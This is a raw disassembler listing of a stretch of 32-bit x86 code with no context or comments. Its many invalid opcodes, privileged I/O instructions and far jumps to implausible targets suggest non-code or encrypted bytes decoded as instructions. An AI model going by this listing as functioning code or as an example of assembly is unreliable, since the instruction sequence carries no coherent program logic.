  416830:	or     DWORD PTR [ecx-0x1fec1ca6],ebx
  416836:	adc    eax,ebx
  416838:	stc    
  416839:	xlat   BYTE PTR ds:[ebx]
  41683a:	add    eax,0xc4f102d1
  41683f:	mov    edi,0xd2781cbe
  416844:	fs scas al,BYTE PTR es:[edi]
  416846:	jge    0x416823
  416848:	pop    edx
  416849:	sti    
  41684a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41684b:	or     DWORD PTR ds:0x168e6cfb,edi
  416851:	daa    
  416852:	call   0x81aff4df
  416857:	push   ebp
  416858:	pop    ebx
  416859:	push   edx
  41685a:	ss scas eax,DWORD PTR es:[edi]
  41685c:	daa    
  41685d:	push   ds
  41685e:	bound  ebx,QWORD PTR [esi]
  416860:	and    esp,ebx
  416862:	in     eax,dx
  416863:	dec    edi
  416864:	shr    esp,1
  416866:	fcmove st,st(3)
  416868:	jo     0x416816
  41686a:	hlt    
  41686b:	cmp    dh,dh
  41686d:	jns    0x4167f8
  41686f:	pop    es
  416870:	dec    ecx
  416871:	jmp    0x2a9ce75d
  416876:	stc    
  416877:	mov    ds:0x7bb9e145,eax
  41687c:	adc    eax,0x2d5f0cc9
  416881:	mov    eax,ds:0x4e26a434
  416886:	sub    al,0x58
  416888:	cmp    al,0x25
  41688a:	push   0x21b81a82
  41688f:	and    BYTE PTR [ebx+0x5773e47a],dh
  416895:	lahf   
  416896:	lds    esp,FWORD PTR [edx-0x401ee894]
  41689c:	xchg   esp,eax
  41689d:	ror    BYTE PTR [eax+0x21],0xa7
  4168a1:	scas   al,BYTE PTR es:[edi]
  4168a2:	cmp    al,0x3e
  4168a4:	lahf   
  4168a5:	cmp    eax,esi
  4168a7:	push   ebx
  4168a8:	inc    edi
  4168a9:	mov    esi,0x1a8a5586
  4168ae:	dec    edx
  4168af:	test   al,0x9a
  4168b1:	jg     0x41686b
  4168b3:	mov    ecx,0x25100e90
  4168b8:	pusha  
  4168b9:	out    0xcc,al
  4168bb:	mov    bh,0xf5
  4168bd:	or     BYTE PTR [esi],0x94
  4168c0:	cmp    eax,0x527618fc
  4168c5:	inc    ecx
  4168c6:	add    edx,0xffffffbc
  4168c9:	scas   al,BYTE PTR es:[edi]
  4168ca:	lea    edi,[edi+eiz*1-0x51]
  4168ce:	sub    cl,BYTE PTR [edi+0x30]
  4168d1:	daa    
  4168d2:	push   0x71b7bf05
  4168d7:	ret    
  4168d8:	xchg   esp,eax
  4168d9:	retf   
  4168da:	and    eax,0xc8772345
  4168df:	mov    WORD PTR [esi+0x29],es
  4168e2:	inc    eax
  4168e3:	shl    ah,1
  4168e5:	test   al,0x7c
  4168e7:	push   edi
  4168e8:	pop    ds
  4168e9:	sub    BYTE PTR [edi],bh
  4168eb:	xchg   BYTE PTR [esi],al
  4168ed:	push   0xd2e38bf3
  4168f2:	pop    es
  4168f3:	push   0xffffffcb
  4168f5:	aad    0x84
  4168f7:	sub    al,0xb7
  4168f9:	mov    ah,0x10
  4168fb:	(bad)  
  4168fc:	push   eax
  4168fd:	fadd   QWORD PTR [esi+0x77d84558]
  416903:	sub    ebp,DWORD PTR [ecx+0x4d]
  416906:	call   0x156c6bd1
  41690b:	cmp    ah,BYTE PTR [esp+ebp*2+0x65]
  41690f:	inc    esp
  416910:	loop   0x416921
  416912:	mov    ebp,0x678546ea
  416917:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416918:	cmp    al,0x98
  41691a:	cmp    ebp,esp
  41691c:	sbb    BYTE PTR [ebx],bl
  41691e:	loopne 0x416916
  416920:	fsub   st(6),st
  416922:	dec    ebx
  416923:	popf   
  416924:	mov    DWORD PTR [esi+0x58],esi
  416927:	and    dh,0xe3
  41692a:	(bad)  
  41692c:	sbb    al,0x26
  41692e:	fcom   DWORD PTR [eax]
  416930:	mov    eax,ds:0xb7a4c96
  416935:	cdq    
  416936:	call   0x6b501a49
  41693b:	mov    ds:0xb89a1e30,eax
  416940:	jbe    0x416998
  416942:	pop    edx
  416943:	rol    DWORD PTR [ecx],0x4e
  416946:	call   0xed7:0xbd9701cc
  41694d:	mov    edi,0xededf95d
  416952:	sahf   
  416953:	ror    DWORD PTR [ebx-0x6697ac4b],0x74
  41695a:	ror    BYTE PTR [ebx],1
  41695c:	test   BYTE PTR [edi+0xb785b83],ah
  416962:	inc    edx
  416963:	pusha  
  416964:	ins    DWORD PTR es:[edi],dx
  416965:	in     eax,dx
  416966:	sahf   
  416967:	mov    eax,0xac60d5ad
  41696c:	sbb    eax,0x4af8920d
  416971:	jmp    0x6bd3:0xf44110ca
  416978:	pop    esp
  416979:	ja     0x416917
  41697b:	xchg   esi,eax
  41697c:	cmp    al,0x6b
  41697e:	scas   al,BYTE PTR es:[edi]
  41697f:	lahf   
  416980:	xchg   ebx,ecx
  416982:	jmp    0x416c66
  416987:	cmc    
  416988:	std    
  416989:	fs mov ah,0x74
  41698c:	jno    0x416983
  41698e:	mov    ecx,0x2f2f76b9
  416993:	hlt    
  416994:	bound  ebx,QWORD PTR [ebx+ecx*4+0x707f1fa5]
  41699b:	mov    ecx,0x4170707e
  4169a0:	xor    al,0x28
  4169a2:	jecxz  0x416939
  4169a4:	mov    db1,edx
  4169a7:	fldenv [ebx-0x7a]
  4169aa:	add    DWORD PTR [edx-0x3730f955],edi
  4169b0:	in     eax,dx
  4169b1:	adc    DWORD PTR [ecx-0x7d0ecfb7],ecx
  4169b7:	push   ebp
  4169b8:	dec    ebx
  4169b9:	cmp    DWORD PTR [edx-0x1e650e7f],edx
  4169bf:	cmp    al,0xa3
  4169c1:	(bad)  
  4169c2:	pop    edx
  4169c3:	mov    WORD PTR [ecx],gs
  4169c5:	scas   al,BYTE PTR es:[edi]
  4169c6:	add    DWORD PTR [ebp+0x28e993f5],0x7c
  4169cd:	sbb    DWORD PTR [ebp+0x50],ebx
  4169d0:	jmp    FWORD PTR [edi]
  4169d2:	nop
  4169d3:	and    al,0x11
  4169d5:	retf   
  4169d6:	cdq    
  4169d7:	stos   DWORD PTR es:[edi],eax
  4169d8:	inc    edx
  4169d9:	push   esp
  4169da:	(bad)  
  4169db:	push   ecx
  4169dc:	fimul  WORD PTR [esi-0x3c]
  4169df:	inc    esi
  4169e0:	mov    al,ds:0x260ea19f
  4169e5:	data16 jb 0x41698e
  4169e8:	repnz add esi,ebp
  4169eb:	push   0x20
  4169ed:	clc    
  4169ee:	sahf   
  4169ef:	sbb    BYTE PTR [edi+0x66],bl
  4169f2:	mov    ah,0x48
  4169f4:	sti    
  4169f5:	outs   dx,DWORD PTR ds:[esi]
  4169f6:	sbb    DWORD PTR [edi],0x9de2c92e
  4169fc:	test   eax,0xacdb0cf0
  416a01:	ins    BYTE PTR es:[edi],dx
  416a02:	sbb    ah,dh
  416a04:	pop    ds
  416a05:	and    eax,0x8c8fbfb6
  416a0a:	in     eax,dx
  416a0b:	into   
  416a0c:	jl     0x4169b9
  416a0e:	outs   dx,DWORD PTR ds:[esi]
  416a0f:	adc    ecx,ecx
  416a11:	in     al,0x5c
  416a13:	push   esp
  416a14:	inc    ebp
  416a15:	adc    edi,edx
  416a17:	cmp    eax,0xde88c1e0
  416a1c:	mov    ebx,0x3f88e056
  416a21:	pop    esi
  416a22:	mov    bl,0x59
  416a24:	aaa    
  416a25:	mov    dl,0x2b
  416a27:	enter  0x7521,0x37
  416a2b:	push   ss
  416a2c:	mov    edi,0x1eb1d44e
  416a31:	push   ds
  416a32:	and    eax,0x92c2b222
  416a37:	mov    gs,WORD PTR [edi]
  416a39:	xchg   edi,eax
  416a3a:	jo     0x416a37
  416a3c:	cmp    BYTE PTR [ebx-0x1e],al
  416a3f:	push   0xffffff96
  416a41:	inc    esi
  416a42:	jo     0x4169d8
  416a44:	xlat   BYTE PTR ds:[ebx]
  416a45:	iret   
  416a46:	mov    WORD PTR [ebp-0x2],es
  416a49:	mov    edx,0x6906cae6
  416a4e:	or     al,0x41
  416a50:	mov    dh,0x45
  416a52:	bound  ebp,QWORD PTR [edx]
  416a54:	retf   0xf6ec
  416a57:	sbb    DWORD PTR [edx],eax
  416a59:	ins    BYTE PTR es:[edi],dx
  416a5a:	cmp    BYTE PTR ds:0x9ef504c7,ah
  416a60:	in     al,dx
  416a61:	addr16 jns 0x416a27
  416a64:	inc    edx
  416a65:	loopne 0x416adf
  416a67:	cmp    cl,BYTE PTR [edi-0x1b6254f6]
  416a6d:	imul   edi,DWORD PTR [eax+0x553fd365],0x67
  416a74:	mov    ebx,0x2724ed90
  416a79:	sahf   
  416a7a:	addr16 data16 sti 
  416a7d:	ins    DWORD PTR es:[edi],dx
  416a7e:	inc    eax
  416a7f:	fist   WORD PTR [ebx+0x36db8c9d]
  416a85:	adc    BYTE PTR [esi+eiz*4-0x31],cl
  416a89:	hlt    
  416a8a:	clc    
  416a8b:	jae    0x416ae4
  416a8d:	inc    esp
  416a8e:	imul   ebx,DWORD PTR [ebx],0xd2fc390b
  416a94:	sbb    dl,BYTE PTR [edi-0x36]
  416a97:	ret    0xfa92
  416a9a:	add    eax,0x6b4b82c4
  416a9f:	inc    esi
  416aa0:	mov    bh,0xb1
  416aa2:	pop    es
  416aa3:	and    edi,ecx
  416aa5:	mov    ch,0x57
  416aa7:	push   0xd9936d6f
  416aac:	mov    ds:0x603751d1,al
  416ab1:	mov    edi,0xd6e0eac2
  416ab6:	jle    0x416a3b
  416ab8:	cmp    BYTE PTR [edi-0x44c944a1],cl
  416abe:	mov    ecx,DWORD PTR [ecx+0x72]
  416ac1:	mov    dh,BYTE PTR [esi-0x43]
  416ac4:	cmp    eax,0xeb26fe63
  416ac9:	idiv   ebx
  416acb:	jecxz  0x416a6e
  416acd:	ret    0xda6b
  416ad0:	xchg   edx,eax
  416ad1:	jbe    0x416b1b
  416ad3:	ss jnp 0x416aba
  416ad6:	jge    0x416b52
  416ad8:	dec    esp
  416ad9:	push   eax
  416ada:	rol    DWORD PTR [ecx-0x161136e],cl
  416ae0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416ae1:	je     0x416a9e
  416ae3:	(bad)  
  416ae4:	jmp    0x7241f050
  416ae9:	jge    0x416b22
  416aeb:	ins    DWORD PTR es:[edi],dx
  416aec:	aaa    
  416aed:	cmp    ch,bl
  416aef:	push   cs
  416af0:	jp     0x416b5e
  416af2:	jne    0x416b10
  416af4:	and    al,0xab
  416af6:	std    
  416af7:	xchg   BYTE PTR [ebx+ecx*1],dl
  416afa:	adc    ecx,DWORD PTR [edi+0x159e3f7c]
  416b00:	out    0xf3,al
  416b02:	pop    es
  416b03:	sti    
  416b04:	xlat   BYTE PTR ds:[ebx]
  416b05:	add    al,0x4
  416b07:	inc    edx
  416b08:	sub    eax,0x2012374c
  416b0d:	cdq    
  416b0e:	js     0x416b18
  416b10:	cmp    dh,BYTE PTR [edi]
  416b12:	jmp    FWORD PTR [ebp+0x53]
  416b15:	push   esp
  416b16:	call   0xfa2ea5d9
  416b1b:	xchg   esp,eax
  416b1c:	mov    esp,0x970b9d41
  416b21:	lods   al,BYTE PTR ds:[esi]
  416b22:	push   ebp
  416b23:	or     DWORD PTR [eax],ebp
  416b25:	data16 or ah,BYTE PTR [ecx+0x4d]
  416b29:	in     al,0x2b
  416b2b:	xchg   edx,eax
  416b2c:	mov    al,0x81
  416b2e:	push   esp
  416b2f:	lods   al,BYTE PTR ds:[esi]
  416b30:	adc    DWORD PTR [esi-0x6b],esi
  416b33:	outs   dx,BYTE PTR ds:[esi]
  416b34:	out    0xb8,eax
  416b36:	pop    edi
  416b37:	mov    bh,0x1f
  416b39:	lock xor ecx,ecx
  416b3c:	fwait
  416b3d:	aaa    
  416b3e:	cmp    eax,0x8ec19de0
  416b43:	sbb    BYTE PTR ds:0x2a1c7162,bl
  416b49:	loopne 0x416b2a
  416b4b:	xlat   BYTE PTR ds:[ebx]
  416b4c:	outs   dx,BYTE PTR ds:[esi]
  416b4d:	fs inc edi
  416b4f:	loop   0x416bc3
  416b51:	jae    0x416b23
  416b53:	ds adc al,0x9e
  416b56:	xor    DWORD PTR [ecx],esp
  416b58:	xchg   ecx,eax
  416b59:	sahf   
  416b5a:	(bad)  
  416b5b:	sbb    DWORD PTR [edi],edi
  416b5d:	pop    ebx
  416b5e:	cmp    ecx,ecx
  416b60:	mov    al,ds:0xaf6ce7db
  416b65:	add    DWORD PTR [ecx],0xdc7be421
  416b6b:	jecxz  0x416b31
  416b6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b6e:	add    ch,BYTE PTR [edi-0x5f2510a5]
  416b74:	dec    esp
  416b75:	add    al,0xc9
  416b77:	mov    ch,0x29
  416b79:	test   al,0xf2
  416b7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b7d:	and    bh,dh
  416b7f:	stos   DWORD PTR es:[edi],eax
  416b80:	sub    al,0xc8
  416b82:	jmp    0x36e41ca
  416b87:	call   0x6a484def
  416b8c:	lea    esp,[esp+ebp*1+0x13418030]
  416b93:	or     eax,ecx
  416b95:	push   es
  416b96:	mov    edi,DWORD PTR [ebx-0x2a]
  416b99:	jae    0x416b31
  416b9b:	fst    DWORD PTR [ecx]
  416b9d:	frstor [ebx+0x783f6a5f]
  416ba3:	jp     0x416c02
  416ba5:	inc    edi
  416ba6:	dec    ebx
  416ba7:	jnp    0x416ba2
  416ba9:	xchg   ecx,eax
  416baa:	lea    ecx,[eiz*8+0x4fcc4584]
  416bb1:	add    eax,0x4a69164f
  416bb6:	fisub  DWORD PTR [esi-0x53]
  416bb9:	sub    al,0x93
  416bbb:	fsubp  st(4),st
  416bbd:	push   es
  416bbe:	test   al,0xda
  416bc0:	inc    eax
  416bc1:	nop
  416bc2:	push   ebx
  416bc3:	dec    edx
  416bc4:	div    esp
  416bc6:	arpl   cx,di
  416bc8:	jae    0x416c48
  416bca:	mov    ecx,DWORD PTR [ebx+eax*4]
  416bcd:	or     eax,0xdb4a7df
  416bd2:	mov    ds:0x5b8edb91,eax
  416bd7:	in     eax,0xf4
  416bd9:	adc    al,0xd8
  416bdb:	push   ss
  416bdc:	(bad)  
  416bdd:	sub    eax,0x2dc9e352
  416be2:	push   ecx
  416be3:	adc    ah,BYTE PTR [ecx+edi*1+0x3f]
  416be7:	pop    ds
  416be8:	out    dx,eax
  416be9:	pop    ebx
  416bea:	pop    ebp
  416beb:	lods   eax,DWORD PTR ds:[esi]
  416bed:	(bad)  
  416bee:	std    
  416bef:	sub    BYTE PTR [bx+si-0x3f],0xfd
  416bf4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416bf5:	xchg   ecx,eax
  416bf6:	dec    ecx
  416bf7:	lock into 
  416bf9:	sbb    BYTE PTR gs:[ebx+0x3f],cl
  416bfd:	sub    al,0x9c
  416bff:	xchg   DWORD PTR [edi+eiz*2+0x4dc28d48],esp
  416c06:	or     al,0xd6
  416c08:	dec    ebx
  416c09:	aad    0x22
  416c0b:	inc    esp
  416c0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c0d:	inc    ebp
  416c0e:	outs   dx,BYTE PTR ds:[esi]
  416c0f:	in     eax,dx
  416c10:	or     al,ch
  416c12:	pop    es
  416c13:	nop
  416c14:	or     eax,0xb03d97e6
  416c19:	lods   eax,DWORD PTR ds:[esi]
  416c1a:	mov    ds:0xd9692ea1,eax
  416c1f:	xor    al,0xfd
  416c21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c22:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c24:	push   0x95832c8a
  416c29:	cwde   
  416c2a:	push   cs
  416c2b:	ret    0xcbb9
  416c2e:	(bad)  
  416c2f:	sub    ch,BYTE PTR [edi-0x24]
  416c32:	adc    dh,BYTE PTR [edi-0x67fae9a0]
  416c38:	push   0x36
  416c3a:	inc    eax
  416c3b:	xchg   ebp,eax
  416c3c:	out    0x79,al
  416c3e:	push   ecx
  416c3f:	and    DWORD PTR [esp+ebx*4+0x5fe76d08],esi
  416c46:	cwde   
  416c47:	jp     0x416c28
  416c49:	ja     0x416bda
  416c4b:	bnd jg 0x416c5c
  416c4e:	out    dx,eax
  416c4f:	push   ebp
  416c50:	sbb    BYTE PTR [ecx+0x67],bl
  416c53:	out    dx,eax
  416c54:	ja     0x416c8b
  416c56:	push   0x7e331ea7
  416c5b:	add    DWORD PTR [esi-0x75],ebp
  416c5e:	call   0xafd5:0xcf17b22d
  416c65:	dec    ebx
  416c66:	dec    ecx
  416c67:	mov    eax,DWORD PTR [ebp-0x1c]
  416c6a:	jmp    0x416f4e
  416c6f:	outs   dx,BYTE PTR ds:[esi]
  416c70:	ds push eax
  416c72:	loopne 0x416cd4
  416c74:	outs   dx,BYTE PTR ds:[esi]
  416c75:	outs   dx,BYTE PTR ds:[esi]
  416c76:	mov    esi,0xcbfa089
  416c7b:	or     edx,eax
  416c7d:	and    ah,dh
  416c7f:	out    dx,al
  416c80:	sbb    al,0x7f
  416c82:	jo     0x416c3d
  416c84:	jle    0x416cf6
  416c86:	jo     0x416c08
  416c88:	jb     0x416ccf
  416c8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c8b:	mov    bl,0xbc
  416c8d:	imul   edx,edi,0xffffffe9
  416c90:	jecxz  0x416ce2
  416c92:	sub    dh,BYTE PTR [ebp+edi*1-0x8]
  416c96:	addr16 push ebp
  416c98:	pop    edx
  416c99:	push   es
  416c9a:	jmp    0x416c97
  416c9c:	dec    ebp
  416c9d:	mov    al,0xf9
  416c9f:	out    dx,eax
  416ca0:	push   ebp
  416ca1:	shr    ebp,cl
  416ca3:	in     eax,dx
  416ca4:	add    edx,DWORD PTR [ebx]
  416ca6:	loopne 0x416c32
  416ca8:	mov    esi,0x531aed79
  416cad:	sub    eax,0x7899ce72
  416cb2:	scas   eax,DWORD PTR es:[edi]
  416cb3:	push   ecx
  416cb4:	stos   BYTE PTR es:[edi],al
  416cb5:	inc    edi
  416cb6:	or     DWORD PTR [edx+ecx*2],ebx
  416cb9:	into   
  416cba:	mov    BYTE PTR [ecx],ah
  416cbc:	mov    ds:0x6bca10fc,eax
  416cc1:	adc    al,0xfd
  416cc3:	and    dl,BYTE PTR [ecx]
  416cc5:	out    dx,al
  416cc6:	pop    esp
  416cc7:	xor    DWORD PTR [ecx],edi
  416cc9:	sub    BYTE PTR [esp+ebx*1+0x3d24f760],bh
  416cd0:	pop    edi
  416cd1:	add    eax,0x95a20479
  416cd6:	mov    ch,0x31
  416cd8:	ret    
  416cd9:	jns    0x416cda
  416cdb:	imul   esp,DWORD PTR [eax-0x30c5ca4c],0xf43c6e7c
  416ce5:	arpl   WORD PTR [ebp+0x7f],sp
  416ce8:	sti    
  416ce9:	scas   eax,DWORD PTR es:[edi]
  416cea:	push   eax
  416ceb:	adc    eax,0xacc94799
  416cf0:	or     eax,0x16e31d95
  416cf5:	in     al,dx
  416cf6:	jge    0x416d26
  416cf8:	push   ebx
  416cf9:	retf   
  416cfa:	jecxz  0x416d29
  416cfc:	jb     0x416d5f
  416cfe:	mov    ch,0x62
  416d00:	inc    edx
  416d01:	mov    bl,0x16
  416d03:	mov    ah,0x39
  416d05:	and    BYTE PTR [ebx-0x1a],al
  416d08:	ja     0x416c97
  416d0a:	xor    al,0x10
  416d0c:	fidiv  WORD PTR [edi+0x3f]
  416d0f:	push   ebx
  416d10:	mov    al,0x36
  416d12:	fwait
  416d13:	dec    esp
  416d14:	sub    al,0xfa
  416d16:	pop    edi
  416d17:	xchg   eax,eax
  416d19:	xchg   ebp,eax
  416d1a:	add    BYTE PTR ds:0x60dcd9e5,dh
  416d20:	push   edx
  416d21:	sub    eax,0xf7829baf
  416d26:	cmp    al,0xee
  416d28:	push   edi
  416d29:	mov    ah,BYTE PTR [ebp+0x3b]
  416d2c:	dec    eax
  416d2d:	stos   BYTE PTR es:[edi],al
  416d2e:	xchg   esp,eax
  416d2f:	je     0x416cfc
  416d31:	stc    
  416d32:	jecxz  0x416d3b
  416d34:	mov    edx,0x101f4397
  416d39:	xchg   esi,eax
  416d3a:	es pop edi
  416d3c:	mov    eax,0x3ffa1a6
  416d41:	fs in  eax,dx
  416d43:	in     al,dx
  416d44:	push   edi
  416d45:	pushf  
  416d46:	(bad)  
  416d47:	lahf   
  416d48:	stos   BYTE PTR es:[edi],al
  416d49:	push   edx
  416d4a:	call   0x6b58:0x35f7d369
  416d51:	push   edx
  416d52:	int3   
  416d53:	cli    
  416d54:	adc    BYTE PTR [edx-0x705ba840],cl
  416d5a:	imul   edi,DWORD PTR [ebp+0xe],0xf8e685c2
  416d61:	clc    
  416d62:	pusha  
  416d63:	sub    al,0x28
  416d65:	and    eax,0xeb177bc6
  416d6a:	and    bl,0x2d
  416d6d:	push   ebp
  416d6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416d6f:	pushf  
  416d70:	div    DWORD PTR [esi+0x5]
  416d73:	in     eax,dx
  416d74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416d75:	sbb    ebx,DWORD PTR [ebp+0x7a0090c4]
  416d7b:	dec    ecx
  416d7c:	(bad)  
  416d7d:	fstp   QWORD PTR [ecx-0x696f4e74]
  416d83:	and    BYTE PTR [eax],ch
  416d85:	mov    WORD PTR [edi],?
  416d87:	push   ds
  416d88:	ja     0x416d4e
  416d8a:	ret    0x2b6d
  416d8d:	in     eax,dx
  416d8e:	in     al,dx
  416d8f:	inc    ebx
  416d90:	and    al,0xde
  416d92:	inc    esp
  416d93:	fwait
  416d94:	mov    eax,0xf396bb5c
  416d99:	clc    
  416d9a:	adc    ah,BYTE PTR [edx+0x5a]
  416d9d:	lods   eax,DWORD PTR ds:[esi]
  416d9e:	pusha  
  416d9f:	sete   BYTE PTR [edx-0x7fe3812a]
  416da6:	push   eax
  416da7:	push   ebp
  416da8:	mov    eax,ds:0x7e9b1449
  416dad:	fcom   DWORD PTR [ebx+0x445cf3d4]
  416db3:	mov    bl,0x78
  416db5:	inc    eax
  416db6:	jbe    0x416d59
  416db8:	frstor ds:0x205bde45
  416dbe:	dec    esi
  416dbf:	xchg   ecx,eax
  416dc0:	fcom   QWORD PTR [eax-0x7061d44b]
  416dc6:	xor    eax,0x916ac2fd
  416dcb:	nop
  416dcc:	(bad)  
  416dcd:	aad    0x71
  416dcf:	ss mov ah,0xad
  416dd2:	idiv   DWORD PTR [eax+ebx*4-0xa]
  416dd6:	retf   0x53ee
  416dd9:	mov    eax,0xc85bd45e
  416dde:	xor    DWORD PTR [ecx-0x14],esp
  416de1:	ins    BYTE PTR es:[edi],dx
  416de2:	adc    eax,0xc6c26aeb
  416de7:	xor    al,0x88
  416de9:	add    al,BYTE PTR [esi]
  416deb:	jecxz  0x416dd1
  416ded:	push   eax
  416dee:	stos   BYTE PTR es:[edi],al
  416def:	and    bl,dh
  416df1:	sbb    eax,0xbd970957
  416df6:	sub    BYTE PTR [ecx-0x42],cl
  416df9:	ins    BYTE PTR es:[edi],dx
  416dfa:	imul   edi,DWORD PTR [edx-0x59],0x9bf856ab
  416e01:	xor    eax,0x3939b106
  416e06:	jns    0x416dfa
  416e08:	iret   
  416e09:	fcom   QWORD PTR [edx+0x4c]
  416e0c:	pop    esi
  416e0d:	adc    BYTE PTR [edx+0x5148c36a],al
  416e13:	fwait
  416e14:	and    eax,0xacaaf71c
  416e19:	push   es
  416e1a:	in     eax,dx
  416e1b:	cwde   
  416e1c:	push   0x5c
  416e1e:	push   ss
  416e1f:	jns    0x416dd3
  416e21:	push   cs
  416e22:	fs cmp al,0x39
  416e25:	jbe    0x416e7f
  416e27:	inc    edi
  416e28:	into   
  416e29:	dec    ecx
  416e2a:	dec    edi
  416e2b:	jbe    0x416dda
  416e2d:	sbb    BYTE PTR [ebx],al
  416e2f:	std    
  416e30:	test   BYTE PTR [edx+ecx*8-0xeb7ecbd],0x6c
  416e38:	and    ecx,DWORD PTR [ecx-0x4d]
  416e3b:	push   0xfdf743f3
  416e40:	(bad)  
  416e41:	and    ah,BYTE PTR [edi+0x64]
  416e44:	mov    DWORD PTR [edx],eax
  416e46:	fisttp QWORD PTR [edi+0x1b]
  416e49:	adc    esi,esi
  416e4b:	pop    eax
  416e4c:	jb     0x416e12
  416e4e:	les    ecx,FWORD PTR [esi]
  416e50:	mov    ebx,0x1803491c
  416e55:	pop    ebx
  416e56:	and    DWORD PTR [ecx+0x2dc2c63c],edi
  416e5c:	jg     0x416eb3
  416e5e:	leave  
  416e5f:	adc    al,0x10
  416e61:	cmp    al,0xd3
  416e63:	xor    eax,DWORD PTR [edx*1+0x23ac7baa]
  416e6a:	repnz imul eax,DWORD PTR [esi+eax*8],0xffffff82
  416e6f:	push   esi
  416e70:	fstp   QWORD PTR [eax]
  416e72:	test   BYTE PTR [ebp-0x44],0xe8
  416e76:	cmp    eax,0xd85714c8
  416e7b:	aad    0x82
  416e7d:	mov    DWORD PTR [esi+0x64],esp
  416e80:	cmc    
  416e81:	iret   
  416e82:	int3   
  416e83:	in     al,0x86
  416e85:	or     ecx,DWORD PTR [edi+0x28bbe955]
  416e8b:	xchg   edi,eax
  416e8c:	cmp    ecx,ebx
  416e8e:	icebp  
  416e8f:	add    BYTE PTR [edx-0x1e],0xbd
  416e93:	out    dx,eax
  416e94:	lods   eax,DWORD PTR ds:[esi]
  416e95:	add    al,BYTE PTR [ebx]
  416e97:	ret    
  416e98:	hlt    
  416e99:	pop    esi
  416e9a:	das    
  416e9b:	or     ch,0x9
  416e9e:	xchg   esp,eax
  416e9f:	cmp    ch,BYTE PTR [edi+0x4ac5d201]
  416ea5:	imul   edi,DWORD PTR [eax-0x7b861119],0x9b2acd1a
  416eaf:	push   0xffffffa2
  416eb1:	push   ss
  416eb2:	ins    BYTE PTR es:[edi],dx
  416eb3:	cdq    
  416eb4:	dec    ecx
  416eb5:	push   ss
  416eb6:	ins    DWORD PTR es:[edi],dx
  416eb7:	mov    edx,0xf58804c
  416ebc:	or     DWORD PTR [esi-0x4d52c905],ebp
  416ec2:	lea    esp,[ebx]
  416ec4:	loope  0x416ead
  416ec6:	mov    ch,0x9
  416ec8:	mov    WORD PTR [ecx+0x19debce3],gs
  416ece:	fcomp  DWORD PTR ss:[esp+eax*1]
  416ed2:	mov    dl,0xa
  416ed4:	mov    ds:0xd6d9c963,al
  416ed9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416eda:	shl    BYTE PTR [ebx+0x77],1
  416edd:	js     0x416e6a
  416edf:	ret    0x792e
  416ee2:	js     0x416f09
  416ee4:	xor    dh,BYTE PTR [edi+esi*2+0x1c]
  416ee8:	jl     0x416e7e
  416eea:	scas   eax,DWORD PTR es:[edi]
  416eeb:	test   al,0xd0
  416eed:	rcl    DWORD PTR [edx],1
  416eef:	(bad)  
  416ef0:	mov    BYTE PTR [ecx+0x2b4771dd],bh
  416ef6:	inc    eax
  416ef7:	sahf   
  416ef8:	out    0x99,eax
  416efa:	pusha  
  416efb:	dec    ecx
  416efc:	fisub  WORD PTR [ebx+edx*8]
  416eff:	xlat   BYTE PTR ds:[ebx]
  416f00:	repnz ss or al,0x2b
  416f04:	sar    DWORD PTR [ecx+0x50],1
  416f07:	xor    esp,DWORD PTR [ebx]
  416f09:	mov    ds:0xda6cdebf,eax
  416f0e:	dec    edi
  416f0f:	dec    esi
  416f10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f11:	xor    BYTE PTR [ecx+0x48],bl
  416f14:	inc    esi
  416f15:	neg    DWORD PTR [esi+0x22]
  416f18:	pop    ss
  416f19:	dec    esi
  416f1a:	mov    dl,0x1
  416f1c:	inc    edx
  416f1d:	jmp    0x8294a2d0
  416f22:	aam    0xbc
  416f24:	inc    ebx
  416f25:	mov    cl,0xf3
  416f27:	fsub   st(0),st
  416f29:	iret   
  416f2a:	in     eax,0xb4
  416f2c:	rcl    DWORD PTR [ecx-0x67],cl
  416f2f:	call   0x2732:0x94e2c958
  416f36:	push   0x9c437896
  416f3b:	push   ss
  416f3c:	xchg   edi,eax
  416f3d:	jo     0x416f53
  416f3f:	sbb    bl,BYTE PTR [ebp+0x1]
  416f42:	imul   eax,DWORD PTR [esi-0x24],0x67
  416f46:	mov    edi,0x8ec64a53
  416f4b:	rcl    DWORD PTR [esi-0x5a],1
  416f4e:	imul   eax,ecx
  416f51:	add    esp,eax
  416f53:	xchg   edx,eax
  416f54:	push   eax
  416f55:	xor    ebx,ebx
  416f57:	mov    edx,esp
  416f59:	jmp    0x41723d
  416f5e:	cmp    al,0x58
  416f60:	push   esp
  416f61:	add    dh,BYTE PTR [edx+esi*1+0x4a]
  416f65:	data16 (bad) 
  416f68:	and    ch,cl
  416f6a:	test   bh,ah
  416f6c:	cmp    eax,0x7f193717
  416f71:	jo     0x416f2c
  416f73:	jle    0x416fe5
  416f75:	jo     0x416fb7
  416f77:	sbb    esp,DWORD PTR [edx+ebx*2]
  416f7a:	cmp    eax,DWORD PTR [ebx+ebp*1+0x6229b4b8]
  416f81:	ins    DWORD PTR es:[edi],dx
  416f82:	xlat   BYTE PTR ds:[ebx]
  416f83:	push   cs
  416f84:	push   0xf1cfd8b5
  416f89:	(bad)  
  416f8a:	(bad)  
  416f8b:	daa    
  416f8c:	int3   
  416f8d:	ins    BYTE PTR es:[edi],dx
  416f8e:	sbb    eax,0xba7057e8
  416f93:	imul   edx,edx,0x5a
  416f96:	pop    eax
  416f97:	mov    al,ds:0x1c0fb6df
  416f9c:	sub    al,0x35
  416f9e:	cmp    BYTE PTR [eax+0x62],dl
  416fa1:	mov    ds:0xa08646c1,al
  416fa6:	aaa    
  416fa7:	fimul  WORD PTR [edx+0x50b74571]
  416fad:	sti    
